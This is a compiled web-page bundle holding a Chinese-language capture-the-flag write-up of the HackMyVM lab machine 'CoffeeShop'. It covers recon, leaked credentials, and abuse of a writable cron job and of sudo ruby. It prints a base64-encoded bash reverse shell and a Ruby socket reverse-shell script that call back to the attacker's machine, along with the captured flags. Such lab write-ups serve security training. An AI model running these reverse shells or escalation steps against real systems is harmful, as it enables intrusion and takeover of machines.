"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[3562],{7089:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>i,contentTitle:()=>c,default:()=>l,frontMatter:()=>a,metadata:()=>o,toc:()=>h});const o=JSON.parse('{"id":"HackMyVM/Machines/CoffeeShop/index","title":"CoffeeShop","description":"[Linux VM] [Tested on VirtualBox and VMWare.] created by || MrMidnight","source":"@site/docs/HackMyVM/Machines/CoffeeShop/index.md","sourceDirName":"HackMyVM/Machines/CoffeeShop","slug":"/HackMyVM/Machines/CoffeeShop/","permalink":"/Target-Machines-WriteUp/docs/HackMyVM/Machines/CoffeeShop/","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackMyVM/Machines/CoffeeShop/index.md","tags":[],"version":"current","frontMatter":{},"sidebar":"HackMyVM_Sidebar","previous":{"title":"Choc","permalink":"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Choc/"},"next":{"title":"Connection","permalink":"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Connection/"}}');var t=r(74848),s=r(28453);const a={},c="CoffeeShop",i={},h=[{value:"\u9776\u673a\u542f\u52a8",id:"\u9776\u673a\u542f\u52a8",level:2},{value:"\u4fe1\u606f\u641c\u96c6",id:"\u4fe1\u606f\u641c\u96c6",level:2},{value:"Web Service",id:"web-service",level:2},{value:"User tuna",id:"user-tuna",level:2},{value:"\u63d0\u6743\u81f3 shopadmin",id:"\u63d0\u6743\u81f3-shopadmin",level:2},{value:"FLAG - USER",id:"flag---user",level:2},{value:"\u63d0\u6743\u81f3 root",id:"\u63d0\u6743\u81f3-root",level:2},{value:"User root",id:"user-root",level:2},{value:"FLAG - ROOT",id:"flag---root",level:2}];function d(e){const n={admonition:"admonition",code:"code",h1:"h1",h2:"h2",header:"header",img:"img",p:"p",pre:"pre",...(0,s.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.header,{children:(0,t.jsx)(n.h1,{id:"coffeeshop",children:"CoffeeShop"})}),"\n",(0,t.jsxs)(n.admonition,{type:"note",children:[(0,t.jsx)(n.p,{children:"[Linux VM] [Tested on VirtualBox and VMWare.] created by || MrMidnight"}),(0,t.jsx)(n.p,{children:"\u23f2\ufe0f Release Date // 2024-01-15"}),(0,t.jsx)(n.p,{children:"\u2714\ufe0f MD5 // e90384f1c4fadc3897f53236768cdea1"}),(0,t.jsx)(n.p,{children:"\u2620 Root // 178"}),(0,t.jsx)(n.p,{children:"\ud83d\udc80 User // 175"}),(0,t.jsx)(n.p,{children:"\ud83d\udcdd Notes //\nMy first ever VM! Enjoy"})]}),"\n",(0,t.jsx)(n.h2,{id:"\u9776\u673a\u542f\u52a8",children:"\u9776\u673a\u542f\u52a8"}),"\n",(0,t.jsx)(n.p,{children:"\u9776\u673a IP"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"192.168.56.128\n"})}),"\n",(0,t.jsx)(n.h2,{id:"\u4fe1\u606f\u641c\u96c6",children:"\u4fe1\u606f\u641c\u96c6"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ sudo nmap --min-rate=2000 -v -A -p- 192.168.56.128\nNmap scan report for bogon (192.168.56.128)\nHost is up (0.00041s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   256 81:a4:52:2b:14:3f:13:68:2b:e2:5b:c4:7b:d7:1a:a5 (ECDSA)\n|_  256 25:19:09:29:2f:b8:ea:b4:29:1f:6d:e7:13:d6:be:7e (ED25519)\n80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))\n|_http-server-header: Apache/2.4.52 (Ubuntu)\n|_http-title: Under Construction - Midnight Coffee\n| http-methods:\n|_  Supported Methods: GET POST OPTIONS HEAD\nMAC Address: 08:00:27:E0:32:F1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4)\nUptime guess: 12.242 days (since Fri Mar 28 08:19:15 2025)\nNetwork Distance: 1 hop\nTCP Sequence Prediction: Difficulty=254 (Good luck!)\nIP ID Sequence Generation: All zeros\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5c1d\u8bd5\u76f4\u63a5\u8bbf\u95ee"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"img",src:r(88811).A+"",width:"2560",height:"1371"})}),"\n",(0,t.jsxs)(n.p,{children:["\u5c06 ",(0,t.jsx)(n.code,{children:"midnight.coffee"})," \u6dfb\u52a0\u4e3a hosts \u8bb0\u5f55\u4e4b\u540e\uff0c\u5c1d\u8bd5\u8fdb\u884c\u76ee\u5f55\u7206\u7834\u548c\u5b50\u57df\u540d\u7206\u7834"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ gobuster vhost -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 200 --append-domain -u http://midnight.coffee/\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:             http://midnight.coffee/\n[+] Method:          GET\n[+] Threads:         200\n[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n[+] User Agent:      gobuster/3.6\n[+] Timeout:         10s\n[+] Append Domain:   true\n===============================================================\nStarting gobuster in VHOST enumeration mode\n===============================================================\nFound: dev.midnight.coffee Status: 200 [Size: 1738]\nProgress: 114441 / 114442 (100.00%)\n===============================================================\nFinished\n===============================================================\n\n\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ dirsearch -u midnight.coffee\nTarget: http://midnight.coffee/\n\n[14:11:36] Starting:\n[14:11:38] 403 -  280B  - /.ht_wsr.txt\n[14:11:38] 403 -  280B  - /.htaccess.bak1\n[14:11:38] 403 -  280B  - /.htaccess.orig\n[14:11:38] 403 -  280B  - /.htaccess.sample\n[14:11:38] 403 -  280B  - /.htaccess.save\n[14:11:38] 403 -  280B  - /.htaccess_orig\n[14:11:38] 403 -  280B  - /.htaccess_extra\n[14:11:38] 403 -  280B  - /.htaccessOLD\n[14:11:38] 403 -  280B  - /.htaccessBAK\n[14:11:38] 403 -  280B  - /.htaccessOLD2\n[14:11:38] 403 -  280B  - /.htaccess_sc\n[14:11:38] 403 -  280B  - /.htm\n[14:11:38] 403 -  280B  - /.html\n[14:11:38] 403 -  280B  - /.htpasswd_test\n[14:11:38] 403 -  280B  - /.htpasswds\n[14:11:38] 403 -  280B  - /.httr-oauth\n[14:11:38] 403 -  280B  - /.php\n[14:12:31] 403 -  280B  - /server-status\n[14:12:31] 403 -  280B  - /server-status/\n[14:12:32] 301 -  317B  - /shop  ->  http://midnight.coffee/shop/\n"})}),"\n",(0,t.jsx)(n.h2,{id:"web-service",children:"Web Service"}),"\n",(0,t.jsxs)(n.p,{children:["\u5c1d\u8bd5\u8bbf\u95ee ",(0,t.jsx)(n.code,{children:"http://midnight.coffee/shop/"})]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"img",src:r(34540).A+"",width:"2560",height:"1371"})}),"\n",(0,t.jsxs)(n.p,{children:["\u53d1\u73b0\u5b58\u5728\u6709\u767b\u5f55\u529f\u80fd\u70b9 ",(0,t.jsx)(n.code,{children:"http://midnight.coffee/shop/login.php"})]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"img",src:r(84422).A+"",width:"2560",height:"1371"})}),"\n",(0,t.jsxs)(n.p,{children:["\u540c\u65f6\u8bbf\u95ee ",(0,t.jsx)(n.code,{children:"http://dev.midnight.coffee/"})," \u80fd\u591f\u5f97\u5230\u4e00\u4efd\u51ed\u636e"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"img",src:r(89539).A+"",width:"2560",height:"1371"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"developer:developer\n"})}),"\n",(0,t.jsxs)(n.p,{children:["\u5c06\u83b7\u5f97\u7684\u51ed\u636e\u5728 ",(0,t.jsx)(n.code,{children:"http://midnight.coffee/shop/login.php"})," \u4e2d\u8fdb\u884c\u767b\u5f55\uff0c\u53ef\u4ee5\u5f97\u5230"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"img",src:r(10360).A+"",width:"2560",height:"1371"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"To login into the server use: tuna : 1L0v3_TuN4_Very_Much\n"})}),"\n",(0,t.jsx)(n.h2,{id:"user-tuna",children:"User tuna"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ pwncat-cs tuna@192.168.56.128\n[14:20:20] Welcome to pwncat \ud83d\udc08!\nPassword: ********************\n[14:20:25] 192.168.56.128:22: registered new host w/ db\n(local) pwncat$ back\n(remote) tuna@coffee-shop:/home/tuna$ whoami\ntuna\n"})}),"\n",(0,t.jsx)(n.h2,{id:"\u63d0\u6743\u81f3-shopadmin",children:"\u63d0\u6743\u81f3 shopadmin"}),"\n",(0,t.jsxs)(n.p,{children:["\u5c1d\u8bd5\u4e0a\u4f20 ",(0,t.jsx)(n.code,{children:"linpeas.sh"})," \u8fdb\u884c\u63d0\u6743\u5206\u6790"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Cron jobs\n\u255a https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs\n/usr/bin/crontab\nincrontab Not Found\n-rwxrwxrwx 1 root root    1184 Jan  3  2024 /etc/crontab\n\n/etc/cron.d:\ntotal 20\ndrwxr-xr-x   2 root root 4096 Jan  3  2024 .\ndrwxr-xr-x 101 root root 4096 Jan  3  2024 ..\n-rw-r--r--   1 root root  201 Jan  8  2022 e2scrub_all\n-rw-r--r--   1 root root  712 Jan 28  2022 php\n-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder\n\n/etc/cron.daily:\ntotal 36\ndrwxr-xr-x   2 root root 4096 Jan  3  2024 .\ndrwxr-xr-x 101 root root 4096 Jan  3  2024 ..\n-rwxr-xr-x   1 root root  539 May  3  2023 apache2\n-rwxr-xr-x   1 root root  376 Nov 11  2019 apport\n-rwxr-xr-x   1 root root 1478 Apr  8  2022 apt-compat\n-rwxr-xr-x   1 root root  123 Dec  5  2021 dpkg\n-rwxr-xr-x   1 root root  377 May 25  2022 logrotate\n-rwxr-xr-x   1 root root 1330 Mar 17  2022 man-db\n-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder\n\n/etc/cron.hourly:\ntotal 12\ndrwxr-xr-x   2 root root 4096 Aug 10  2023 .\ndrwxr-xr-x 101 root root 4096 Jan  3  2024 ..\n-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder\n\n/etc/cron.monthly:\ntotal 12\ndrwxr-xr-x   2 root root 4096 Aug 10  2023 .\ndrwxr-xr-x 101 root root 4096 Jan  3  2024 ..\n-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder\n\n/etc/cron.weekly:\ntotal 16\ndrwxr-xr-x   2 root root 4096 Aug 10  2023 .\ndrwxr-xr-x 101 root root 4096 Jan  3  2024 ..\n-rwxr-xr-x   1 root root 1020 Mar 17  2022 man-db\n-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder\n\nSHELL=/bin/sh\n\n17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly\n25 6    * * *   root    test -x /usr/sbin/anacron || (cd / && run-parts --report /etc/cron.daily)\n47 6    * * 7   root    test -x /usr/sbin/anacron || (cd / && run-parts --report /etc/cron.weekly)\n52 6    1 * *   root    test -x /usr/sbin/anacron || (cd / && run-parts --report /etc/cron.monthly)\n* * * * * /bin/bash /home/shopadmin/execute.sh\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u67e5\u770b\u811a\u672c\u6587\u4ef6\u7684\u5185\u5bb9"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",metastring:'title="/home/shopadmin/execute.sh"',children:"#!/bin/bash\n\n/bin/bash /tmp/*.sh\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5c1d\u8bd5\u5229\u7528\u8fd9\u4e2a\u5b9a\u65f6\u4efb\u52a1"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"(remote) tuna@coffee-shop:/home/tuna$ echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEyNy85OTk5IDA+JjE= | base64 -d\nbash -i >& /dev/tcp/192.168.56.127/999\n(remote) tuna@coffee-shop:/home/tuna$ echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEyNy85OTk5IDA+JjE= | base64 -d > /tmp/shell-1.sh\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u7a0d\u7b49\u7247\u523b\uff0c\u5373\u53ef\u6536\u5230\u56de\u8fde\u7684 shell"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ pwncat-cs -lp 9999\n[14:26:37] Welcome to pwncat \ud83d\udc08!\n[14:28:02] received connection from 192.168.56.128:39020\n[14:28:02] 192.168.56.128:39020: registered new host w/ db\n(local) pwncat$ back\n(remote) shopadmin@coffee-shop:/home/shopadmin$ whoami\nshopadmin\n"})}),"\n",(0,t.jsx)(n.h2,{id:"flag---user",children:"FLAG - USER"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-flag",metastring:'title="/home/shopadmin/user.txt"',children:"DR1NK1NG-C0FF33-4T-N1GHT\n"})}),"\n",(0,t.jsx)(n.h2,{id:"\u63d0\u6743\u81f3-root",children:"\u63d0\u6743\u81f3 root"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"(remote) shopadmin@coffee-shop:/home/shopadmin$ sudo -l\nMatching Defaults entries for shopadmin on coffee-shop:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser shopadmin may run the following commands on coffee-shop:\n    (root) NOPASSWD: /usr/bin/ruby * /opt/shop.rb\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u90a3\u4e48\u5c31\u5f88\u7b80\u5355\u4e86\uff0c\u4e2d\u95f4\u53ef\u4ee5\u63d2\u5165\u4efb\u610f\u53c2\u6570\u7684\u8bdd\uff0c\u5c31\u53ef\u4ee5\u7ee7\u7eed\u6784\u9020\u53cd\u5f39 shell"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"# Machine\n(remote) shopadmin@coffee-shop:/home/shopadmin$ echo cmVxdWlyZSAnc29ja2V0JwoKcyA9IFNvY2tldC5uZXcgMiwxCnMuY29ubmVjdCBTb2NrZXQuc29ja2FkZHJfaW4gOTk5OCwgJzE5Mi4xNjguNTYuMTI3JwoKWzAsMSwyXS5lYWNoIHsgfGZkfCBzeXNjYWxsIDMzLCBzLmZpbGVubywgZmQgfQpleGVjICcvYmluL3NoIC1pJwo= | base64 -d\nrequire 'socket'\n\ns = Socket.new 2,1\ns.connect Socket.sockaddr_in 9998, '192.168.56.127'\n\n[0,1,2].each { |fd| syscall 33, s.fileno, fd }\nexec '/bin/sh -i'\n(remote) shopadmin@coffee-shop:/home/shopadmin$ echo cmVxdWlyZSAnc29ja2V0JwoKcyA9IFNvY2tldC5uZXcgMiwxCnMuY29ubmVjdCBTb2NrZXQuc29ja2FkZHJfaW4gOTk5OCwgJzE5Mi4xNjguNTYuMTI3JwoKWzAsMSwyXS5lYWNoIHsgfGZkfCBzeXNjYWxsIDMzLCBzLmZpbGVubywgZmQgfQpleGVjICcvYmluL3NoIC1pJwo= | base64 -d > /tmp/shell-2.rb\n(remote) shopadmin@coffee-shop:/home/shopadmin$ sudo /usr/bin/ruby /tmp/shell-2.rb /opt/shop.rb\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5373\u53ef\u6536\u5230\u56de\u8fde\u7684 shell"}),"\n",(0,t.jsx)(n.h2,{id:"user-root",children:"User root"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ pwncat-cs -lp 9998\n[14:33:20] Welcome to pwncat \ud83d\udc08!\n[14:34:40] received connection from 192.168.56.128:42732\n[14:34:40] 0.0.0.0:9998: upgrading from /usr/bin/dash to /usr/bin/bash\n[14:34:41] 192.168.56.128:42732: registered new host w/ db\n(local) pwncat$ back\n(remote) root@coffee-shop:/home/shopadmin# whoami\nroot\n"})}),"\n",(0,t.jsx)(n.h2,{id:"flag---root",children:"FLAG - ROOT"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-flag",metastring:'title="/root/root.txt"',children:"C4FF3331N-ADD1CCCTIONNNN\n"})})]})}function l(e={}){const{wrapper:n}={...(0,s.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(d,{...e})}):d(e)}},88811:(e,n,r)=>{r.d(n,{A:()=>o});const o=r.p+"assets/images/image_20250408-140832-319fb07a22c7d6240637f325f821db32.png"},34540:(e,n,r)=>{r.d(n,{A:()=>o});const o=r.p+"assets/images/image_20250415-141500-2462cfb2fff449e3ee2cc923db5d3d54.png"},84422:(e,n,r)=>{r.d(n,{A:()=>o});const o=r.p+"assets/images/image_20250415-141520-cc9258e3bb8616eff84db6a7bbf39989.png"},89539:(e,n,r)=>{r.d(n,{A:()=>o});const o=r.p+"assets/images/image_20250418-141856-3888a4d3f8207d1d54c98c368f723ec5.png"},10360:(e,n,r)=>{r.d(n,{A:()=>o});const o=r.p+"assets/images/image_20250419-141940-7f38f86e52b93715fcbff715d2dc8971.png"},28453:(e,n,r)=>{r.d(n,{R:()=>a,x:()=>c});var o=r(96540);const t={},s=o.createContext(t);function a(e){const n=o.useContext(s);return o.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:a(e.components),o.createElement(s.Provider,{value:n},e.children)}}}]);